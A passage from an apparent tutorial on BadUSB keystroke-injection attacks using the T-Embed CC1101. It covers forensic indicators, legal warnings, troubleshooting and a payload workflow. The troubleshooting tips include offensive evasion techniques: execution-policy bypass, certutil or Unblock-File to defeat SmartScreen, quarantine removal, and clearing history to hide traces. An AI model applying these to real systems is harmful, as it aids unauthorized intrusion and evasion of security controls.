| **Network anomaly detection** | Unexpected outbound connections from PowerShell/cmd | Only catches network-based payloads |
| **Screen recording** | Visual evidence of windows flashing, rapid typing | After-the-fact detection only |

### Forensic Indicators

After a BadUSB attack, look for:

```
Windows Event Logs:
- Event ID 6416 (Security): New external device recognized
- Event ID 20001/20003 (DeviceSetup): Device driver installed
- Event ID 4688 (Security): New process created (cmd.exe, powershell.exe)
- Event ID 4104 (PowerShell): Script block logging

Registry:
- HKLM\SYSTEM\CurrentControlSet\Enum\USB — lists all USB devices ever connected
- Check for unknown HID VID/PID combinations

File System:
- Recently modified files in %TEMP%, %APPDATA%, Desktop
- New scheduled tasks in C:\Windows\System32\Tasks
- New user accounts in net user output
- Modified startup items

Network:
- Unexpected outbound connections in firewall logs
- DNS queries to unknown domains
- Data uploads to unknown servers
```

---

## Legal and Ethical Considerations

> **BadUSB attacks are illegal without authorization.** The act of plugging a BadUSB device into a computer you do not own and executing commands constitutes unauthorized computer access — a criminal offense in virtually every jurisdiction.
{: .danger }

### Legal Framework

| Jurisdiction | Law | Penalty |
|:---|:---|:---|
| United States | Computer Fraud and Abuse Act (CFAA) | Up to 10 years prison, fines |
| United Kingdom | Computer Misuse Act 1990 | Up to 10 years prison |
| European Union | Directive 2013/40/EU on attacks against information systems | Varies by member state |
| Australia | Criminal Code Act 1995, Part 10.7 | Up to 10 years prison |
| Canada | Criminal Code, Section 342.1 | Up to 10 years prison |

### Authorized Use Requirements

For legal BadUSB testing, you need:

1. **Written authorization** from the system owner explicitly permitting BadUSB/HID attacks.
2. **Defined scope**: which systems, which types of attacks, time window.
3. **Rules of engagement**: what actions are permitted, what data can be accessed.
4. **Incident response plan**: who to contact if something goes wrong.
5. **Documentation**: log every action taken during the assessment.
6. **Data handling**: how collected data (passwords, system info) will be stored and destroyed.

### Ethical Guidelines

```
Ethical BadUSB Checklist:

✓ I have written authorization to test this system
✓ I understand exactly what my payload does
✓ My payload does not cause permanent damage
✓ I will not access data beyond the scope of the assessment
✓ I will securely delete any sensitive data collected
✓ I will report all findings to the system owner
✓ I will not use this knowledge against non-consenting targets
✗ "I was just testing" is NOT a legal defense
✗ "The computer was unlocked" does NOT imply consent
✗ Testing on a friend's computer without telling them is NOT authorized
```

---

## Troubleshooting BadUSB

### T-Embed not recognized as keyboard

| Symptom | Cause | Solution |
|:---|:---|:---|
| No device enumeration | USB cable is charge-only (no data lines) | Use a USB data cable |
| Device enumerates as wrong type | Firmware not in BadUSB mode | Navigate to BadUSB menu before connecting |
| Device not recognized by OS | Driver issue or USB port problem | Try a different USB port; try a different cable |
| Constant connect/disconnect | Bad cable, loose connection | Replace cable, ensure secure connection |

### Script not executing correctly

| Symptom | Cause | Solution |
|:---|:---|:---|
| Wrong characters typed | Keyboard layout mismatch | Match the script's keyboard layout to the target OS layout |
| Commands typed too fast | Target drops fast keystrokes | Add `DEFAULT_DELAY 50` at the top of the script |
| Commands typed into wrong window | Window focus changed unexpectedly | Add longer delays after opening windows; use `ALT TAB` to verify focus |
| Script stops mid-execution | Timeout or error in T-Embed | Check script for syntax errors; test with shorter script first |
| PowerShell commands fail | Execution policy restrictions | Add `-ExecutionPolicy Bypass` flag |
| UAC blocks admin action | User interaction required | Script cannot bypass UAC without user clicking Yes |

### OS-specific issues

| Issue | OS | Solution |
|:---|:---|:---|
| SmartScreen blocks download | Windows | Use `certutil` instead of `Invoke-WebRequest`, or bypass SmartScreen via `Unblock-File` |
| Gatekeeper blocks execution | macOS | Downloaded executables need `xattr -d com.apple.quarantine` |
| Script runs but nothing visible | Any | The script may be working in a hidden window; check processes and output files |
| Terminal does not open | Linux | `Ctrl+Alt+T` may not work on all desktop environments; try alternative shortcuts |
| Screen lock during execution | Any | Script was too slow; user locked the screen; reduce delays, speed up payload |

### General tips

> **Always test your payload on an identical OS and version before deploying.** A payload that works on Windows 10 22H2 may fail on Windows 11 23H2 due to UI changes, different default shell, or updated security features.
{: .tip }

> **Keep payloads short and fast.** The longer a BadUSB script runs, the higher the chance of detection. Aim for under 5 seconds of visible activity. Download longer scripts from a server rather than typing them character by character.
{: .tip }

> **Have a fallback plan.** If the payload fails partway through, it may leave windows open or commands partially typed. Include cleanup commands at the end of your script (close windows, clear command history, delete temp files).
{: .note }

---

## BadUSB Payload Development Workflow

```
Development Process:

  ┌──────────────┐
  │ 1. Define    │  What is the objective?
  │    objective │  What data to collect/action to take?
  └──────┬───────┘
         ▼
  ┌──────────────┐
  │ 2. Identify  │  What OS? What version?
  │    target OS │  What keyboard layout?
  └──────┬───────┘
         ▼
  ┌──────────────┐
  │ 3. Write     │  Start with simple proof of concept.
  │    script    │  Add complexity incrementally.
  └──────┬───────┘
         ▼
  ┌──────────────┐
  │ 4. Test on   │  Use a VM or your own machine.
  │    own system│  Verify every step works.
  └──────┬───────┘
         ▼
  ┌──────────────┐
  │ 5. Adjust    │  Fix timing, layout, command issues.
  │    timing    │  Test on slow and fast machines.
  └──────┬───────┘
         ▼
  ┌──────────────┐
  │ 6. Add       │  Minimize windows, clear history,
  │    stealth   │  delete temp files.
  └──────┬───────┘
         ▼
  ┌──────────────┐
  │ 7. Deploy    │  Only on authorized target systems
  │    (auth'd)  │  with written permission.
  └──────┬───────┘
         ▼
  ┌──────────────┐
  │ 8. Document  │  Log actions, findings, timestamps.
  │    & report  │  Include in pentest report.
  └──────────────┘
```

---

## Summary

| Capability | T-Embed Support | Notes |
|:---|:---|:---|
| USB HID Keyboard Emulation | Full | Native ESP32-S3 USB OTG |
| Ducky Script Execution | Full | Standard Ducky Script syntax |
| Pre-built Payloads | Yes | Varies by firmware version |
| Custom Script Upload | Yes | Via microSD card or web interface |
| Windows Attacks | Full | PowerShell, cmd, Run dialog |
| macOS Attacks | Partial | Limited by sudo password requirement |
| Linux Attacks | Full | Terminal shortcut varies by DE |
| Keyboard Layout Support | Configurable | Must match target OS layout |
| USB Mouse Emulation | Firmware Dependent | Some Bruce versions support HID mouse |
| Composite Device (KB + Storage) | Firmware Dependent | Allows data exfiltration to device |

BadUSB is one of the most powerful capabilities of the T-Embed CC1101, transforming it from a passive analysis tool into an active penetration testing device. The simplicity of the attack — a USB cable, a script, and physical access — makes it both remarkably effective and remarkably dangerous. Always use this capability responsibly, legally, and ethically, with proper authorization and documentation.
